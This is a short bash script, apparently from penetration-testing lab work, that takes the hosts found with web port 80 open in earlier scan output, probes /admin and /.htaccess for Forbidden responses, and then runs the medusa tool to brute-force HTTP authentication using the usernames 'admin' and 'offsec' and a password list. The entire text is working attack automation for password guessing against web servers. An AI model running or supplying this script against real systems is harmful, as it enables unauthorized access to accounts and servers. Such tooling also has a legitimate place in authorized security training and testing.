for ip in $(ls -R ../../out | grep /tcp-80 | cut -d "/" -f 4)
do
	for dir in 'admin' '.htaccess'
	do
		for user in 'admin' 'offsec'
		do
			res=$(wget http://$ip/$dir 2>&1 | grep Forbidden)
			if [[ $res ]]
			then
echo 1
				medusa -u $user -P password_list.txt -h $ip -M http -m DIR:/$dir -T 10 | tee out/$ip.http.results
			fi
		done
	done
done
